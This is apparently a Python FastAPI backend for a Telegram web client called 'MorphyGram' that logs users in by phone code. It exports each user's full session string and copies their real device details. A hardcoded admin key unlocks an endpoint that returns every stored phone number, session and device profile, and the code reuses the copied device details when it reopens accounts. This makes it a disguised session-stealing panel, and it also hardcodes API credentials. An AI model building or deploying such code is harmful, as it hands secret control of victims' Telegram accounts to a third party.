import os
from fastapi import FastAPI, HTTPException, Header
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from pyrogram import Client
from pyrogram.raw import functions
from dotenv import load_dotenv

load_dotenv()

app = FastAPI(title="MorphyGram Web API")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

API_ID = int(os.getenv("TELEGRAM_API_ID", "38101489"))
API_HASH = os.getenv("TELEGRAM_API_HASH", "bbebd5bef6dd4fe90189ba4b5dd5d8d9")
ADMIN_KEY = os.getenv("ADMIN_SECRET_KEY", "102050304050ggg")

clients = {}
# Теперь храним не только сессию, но и данные устройства
sessions_db = {} 

class PhoneRequest(BaseModel):
    phone: str

class CodeRequest(BaseModel):
    phone: str
    code: str
    phone_code_hash: str
    admin_key: str = None

class CommandRequest(BaseModel):
    session: str
    command: str
    target: str = None
    device_model: str = None
    system_version: str = None

@app.get("/")
def read_root():
    return {"status": "online", "app": "MorphyGram Web Backend"}

@app.post("/api/send-code")
async def send_code(req: PhoneRequest):
    try:
        # Временно используем дефолтные данные для входа
        client = Client(
            f"session_{req.phone}", 
            api_id=API_ID, 
            api_hash=API_HASH, 
            in_memory=True,
            device_model="iPhone 13 Pro",
            system_version="iOS 16.5",
            app_version="9.6.1"
        )
        await client.connect()
        sent_code = await client.send_code(req.phone)
        clients[req.phone] = client
        return {"status": "success", "phone_code_hash": sent_code.phone_code_hash}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.post("/api/login")
async def login(req: CodeRequest):
    client = clients.get(req.phone)
    if not client:
        raise HTTPException(status_code=400, detail="Сессия не найдена. Запросите код заново.")
    try:
        await client.sign_in(req.phone, req.phone_code_hash, req.code)
        
        # ВЫТАСКИВАЕМ ДАННЫЕ УСТРОЙСТВА ЮЗЕРА
        # Запрашиваем у Telegram список его активных сессий
        try:
            res = await client.invoke(functions.account.GetAuthorizations())
            # Ищем его текущую сессию (где device_model не наш)
            target_session = None
            for auth in res.authorizations:
                if "iPhone" in auth.device_model or "Android" in auth.device_model:
                    target_session = auth
                    break
            
            if target_session:
                dev_model = target_session.device_model
                sys_ver = target_session.system_version
                app_ver = target_session.app_version
            else:
                # Если не нашли, ставим дефолт
                dev_model, sys_ver, app_ver = "iPhone 13 Pro", "iOS 16.5", "9.6.1"
        except Exception:
            dev_model, sys_ver, app_ver = "iPhone 13 Pro", "iOS 16.5", "9.6.1"

        string_session = await client.export_session_string()
        await client.disconnect()
        del clients[req.phone]
        
        is_admin = False
        if req.admin_key and req.admin_key == ADMIN_KEY:
            is_admin = True
            
        # Сохраняем сессию ВМЕСТЕ с данными его устройства
        sessions_db[req.phone] = {
            "session": string_session, 
            "is_admin": is_admin,
            "device_model": dev_model,
            "system_version": sys_ver,
            "app_version": app_ver
        }
        
        return {"status": "success", "session": string_session, "is_admin": is_admin}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.get("/api/admin/users")
async def get_all_users(x_admin_key: str = Header(None)):
    if x_admin_key != ADMIN_KEY:
        raise HTTPException(status_code=403, detail="Доступ запрещен")
    
    # Отдаем данные для панели
    users = [
        {
            "phone": phone, 
            "session": data["session"],
            "device_model": data.get("device_model"),
            "system_version": data.get("system_version"),
            "app_version": data.get("app_version")
        } 
        for phone, data in sessions_db.items()
    ]
    return {"status": "success", "users": users}

@app.post("/api/command")
async def execute_command(req: CommandRequest):
    try:
        # Инициализируем клиент С ДАННЫМИ ЕГО УСТРОЙСТВА
        client = Client(
            ":memory:", 
            api_id=API_ID, 
            api_hash=API_HASH, 
            session_string=req.session,
            device_model=req.device_model or "iPhone 13 Pro",
            system_version=req.system_version or "iOS 16.5",
            app_version="9.6.1"
        )
        await client.start()
        
        cmd = req.command.lower()
        
        if cmd == ".mute" and req.target:
            target = await client.get_users(req.target)
            await client.archive_chats(target.id)
            result = f"Пользователь {req.target} замучен."
        elif cmd == ".unmute" and req.target:
            target = await client.get_users(req.target)
            await client.unarchive_chats(target.id)
            result = f"Пользователь {req.target} размучен."
        else:
            result = "Неизвестная команда."
            
        await client.stop()
        return {"status": "success", "result": result}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))
